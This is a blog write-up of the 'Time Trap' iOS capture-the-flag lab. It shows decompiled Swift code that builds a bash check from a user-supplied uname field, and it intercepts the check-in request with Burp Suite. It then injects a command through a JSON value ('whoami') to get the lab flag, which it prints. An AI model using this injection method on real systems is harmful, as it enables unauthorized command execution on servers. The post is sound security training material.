---
layout: post
title: Time Trap - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, iOS Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Time Trap](https://www.mobilehackinglab.com/course/lab-time-trap) lab allows for a deeper understanding of injection vulnerabilities and highlights the importance of intercepting traffic when analyzing an iOS application to achieve code execution.<!--more--> In this article, we will walk through the necessary steps to identify and exploit the vulnerability.

### Introduction

When we open the application, we see a login window. Trying any combination of username and password results in a message saying "invalid credentials." Since we don't have the option to create a user, let's look behind the scenes to discover what we can do.

### Static Analysis

Our journey begins by examining the `Info.plist` file. Here, we notice a reference to another lab called [Gotham Times](https://www.mobilehackinglab.com/course/lab-gotham-times), where user creation was possible. Read full [writeup](https://bernasv.com/2024/06/08/gotham-times.html).

```xml
<!-- Info.plist-->
<array>
<dict>
<key>CFBundleTypeRole</key>
<string>Viewer</string>
<key>CFBundleURLName</key>
<string>com.mobilehackinglab.Gotham-Times</string>
<key>CFBundleURLSchemes</key>
<array>
<string>gothamtimes</string>
</array>
</dict>
</array>
```

By using the credentials from the Gotham Times lab, we successfully log into the Time Trap application. Post-login, two new functionalities become available: checking in the device and settings. Clicking the "Check In" button reveals the following information:

```text
Check in: <Date time>
Check out <Date time>
Device: <Seems like the output of the uname command>
```

The device part appears to be the output of the `uname -a` command. Now let's turn our attention to reverse engineering the application code, where we find an intriguing function named `AttendanceController::buttonPressed`. This function handles the logic when the "Check In" button is pressed. Looking into the code, we find these snippets:

```c
SVar24 = Swift::String::init("if [[ $(uname -a) != \"",0x16,1);
SVar24 = Swift::String::init("\" ]]; then uname -a; fi",0x17,1);
```

These variables suggest the application constructs a bash script, which ultimately resembles:

```bash
if [[ $(uname -a) != "Some check"]]; 
    then uname -a; 
fi
```

By controlling this variable, a command injection vulnerability becomes apparent.

```c
// AttendanceController::buttonPressed Function
void __thiscall
Time_Trap::AttendanceController::buttonPressed(AttendanceController *this,UIButton *param_1)

{
  int iVar1;
  String uname;
 ...
  local_1e4 = dVar19;
  if ((dVar19 & 0xff) != 0xff) {
    local_48 = (byte)dVar19 & 1;
    local_28c = dVar19;
    local_288 = pUVar12;
    local_280 = pUVar12;
    local_274 = dVar19;
    local_50 = pUVar12;
    if ((dVar19 & 1) == 0) {
      local_318 = pUVar12;
      local_298 = pUVar12;
      _swift_bridgeObjectRetain();
      local_80 = local_318;
      _swift_bridgeObjectRetain();
      local_308 = &local_d0;
      local_d0 = local_318;
      puVar15 = &$$demangling_cache_variable_for_type_metadata_for_[Time_Trap.AttendanceDetails];
      ___swift_instantiateConcreteTypeFromMangledName();
      local_310 = puVar15;
      Swift::Array<>::$lazy_protocol_witness_table_accessor();
      (extension_Swift)::Swift::Collection::$get_first();
      puVar7 = local_270;
      $$outlined_destroy_of_[Time_Trap.AttendanceDetails](local_308);
      ...
      local_2b8 = 0;
      local_128 = (char *)0x0;
      local_120 = (void *)0x0;
      (**(code **)((*puVar7 & *local_1f8) + 0xa0))(local_210);
      $$outlined_init_with_copy_of_Foundation.Date?(local_210,local_220);
      local_2b0 = Foundation::Date::typeMetadataAccessor();
      local_2a8 = *(int *)(local_2b0.unknown + -8);
      iVar13 = local_220;
      (**(code **)(local_2a8 + 0x30))(local_220,1);
      bVar10 = (sdword)iVar13 == 1;
      if (!bVar10) {
        $$outlined_destroy_of_Foundation.Date?(local_220);
      }
      local_31c = (dword)bVar10;
      local_320 = local_31c;
      $$outlined_destroy_of_Foundation.Date?(local_210);
      puVar7 = local_270;
      if ((local_320 & 1) == 0) {
        uVar20 = 1;
        local_138 = Swift::DefaultStringInterpolation::init(0x2d,1);
        DVar22.unknown = (undefined *)0x1;
        local_130 = uVar20;
        SVar24 = Swift::String::init("if [[ $(uname -a) != \"",0x16,1);
        local_478 = SVar24.bridgeObject;
        Swift::DefaultStringInterpolation::appendLiteral(SVar24,DVar22);
        _swift_bridgeObjectRelease(local_478);
        uVar6 = local_2c8;
        uVar5 = local_2d0;
        uVar4 = local_2d8;
        pvVar17 = local_2e0;
        pcVar21 = local_2e8;
        uVar3 = local_2f0;
        uVar2 = local_2f8;
        uVar20 = local_300;
        *(undefined8 *)(iVar1 + -0x10) = local_2c0;
        $outlined_copy((char)uVar20,(char)uVar2,(char)uVar3,(char)pcVar21,(char)pvVar17,(char)uVar4,
                       (char)uVar5,(char)uVar6,*(undefined8 *)(iVar1 + -0x10));
        if (local_2e0 == (void *)0x0) {
          local_4a8 = (char *)0x0;
          local_4a0 = (void *)0x0;
        }
        else {
         ...
          _swift_bridgeObjectRetain();
          _swift_bridgeObjectRelease(local_4b0);
          _swift_bridgeObjectRelease(local_4c8);
          _swift_bridgeObjectRelease(local_4c0);
          local_4a8 = local_4b8;
          local_4a0 = local_4b0;
        }
        local_4d0 = local_4a0;
        local_4d8 = local_4a8;
        _swift_bridgeObjectRetain();
        local_158 = local_4d8;
        local_150 = local_4d0;
        if (local_4d0 == (void *)0x0) {
          local_148 = Swift::String::init("",0,1);
        }
        else {
          local_148.bridgeObject = local_4d0;
          local_148.str = local_4d8;
        }
        _swift_bridgeObjectRelease(local_4d0);
        local_518 = &local_168;
        local_168 = local_148.str;
        local_160 = local_148.bridgeObject;
        local_508 = &local_138.unknown;
        Swift::DefaultStringInterpolation::$appendInterpolation
                  ((char)local_518,
                   (DefaultStringInterpolation)PTR_$$type_metadata_for_Swift.String_100028460);
        $$outlined_destroy_of_Swift.String(local_518);
        DVar22.unknown = (undefined *)0x1;
        SVar24 = Swift::String::init("\" ]]; then uname -a; fi",0x17,1);
        local_510 = SVar24.bridgeObject;
        Swift::DefaultStringInterpolation::appendLiteral(SVar24,DVar22);
        _swift_bridgeObjectRelease(local_510);
        local_4f8.unknown = local_138.unknown;
        local_500 = local_130;
        _swift_bridgeObjectRetain();
        $$outlined_destroy_of_Swift.DefaultStringInterpolation(local_508);
        SVar24 = Swift::String::init(local_4f8);
        local_4f0 = SVar24.bridgeObject;
        CVar14 = Swift::String::get_utf8CString(SVar24);
        AVar11 = Swift::Array<undefined>::$init((char)CVar14.unknown);
        puVar15 = (undefined *)CONCAT44(extraout_var_00,AVar11);
        local_4e8 = puVar15;
        Swift::Array<undefined>::$get__baseAddressIfContiguous(AVar11);
        local_4e0 = puVar15;
        if ((puVar15 != (undefined *)0x0) ||
           (bVar10 = (extension_Swift)::Swift::Collection::get_isEmpty(), bVar10)) {
          puVar15 = local_4e8;
          Swift::Array<undefined>::$get__owner((Array<undefined>)local_4e8);
          local_538 = puVar15;
          local_520 = puVar15;
          if (local_4e0 == (undefined *)0x0) {
            local_530 = (undefined *)0x0;
          }
          else {
            local_528 = local_4e0;
            local_530 = local_4e0;
          }
        }
        else {
          _swift_bridgeObjectRetain(local_4e8);
          local_588 = Swift::ContiguousArray::$init((char)local_4e8);
          _swift_retain();
          _swift_release(local_588.unknown);
          _Var16.unknown = local_588.unknown;
          Swift::_ContiguousArrayBuffer::$get_owner((_ContiguousArrayBuffer)local_588.unknown);
          local_580 = _Var16.unknown;
          local_578 = Swift::_ContiguousArrayBuffer::get_firstElementAddress(local_588.unknown);
          _swift_release(local_588.unknown);
          local_530 = local_578.unknown;
          local_538 = local_580;
        }
        ...

}
```

Using Burp Suite as a man-in-the-middle proxy, we observe the traffic between the iOS application and the server. Each time the "Check In" button is pressed, a request is sent to the `/time-trap/attendance` endpoint with the following structure:

```
POST /time-trap/attendance HTTP/2
Host: mhl.pages.dev
Accept: */*
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer <LoginBearer>
Accept-Encoding: gzip, deflate, br
User-Agent: Time%20Trap/1 CFNetwork/1404.0.5 Darwin/22.3.0
Accept-Language: en-GB,en;q=0.9
Content-Length: 12

{
    "uname":""
}
```

Let's intercept the request and modify this value to see if we can achieve command injection.

### Exploiting the Application

First, let's open the application and log in using the GotHam Times credentials. Next, we'll set Burp Suite to intercept the requests and click the "check in" button. Upon clicking the button, a request to the `/time-trap/attendance` endpoint with the body containing `{"uname":""}` will appear in Burp Suite. We will then send the following body to confirm our injection:

```text
{"uname":"]]]; then whoami; fi #"}
```

When we look at the server response, we can see that the server responds with the flag, thereby confirming the vulnerability.
```text
{"id":33,"user_id":2,"uname":"]];whoami","check_in":"2024-06-11 09:27:56","check_out":null,"flag":"MHL{9_t0_5_C0mm4ndz_Sl4v1ng_4w4y}"}
```

### Conclusion

This lab underscores the importance of intercepting traffic using tools like Burp Suite and demonstrates how unsanitized data can lead to critical vulnerabilities, such as command injection. For those eager to enhance their mobile security skills, visiting the [MobileHackingLab - Time Trap](https://www.mobilehackinglab.com/course/lab-time-trap) provides a practical and enlightening experience. Embark on this journey and fortify your expertise in mobile security.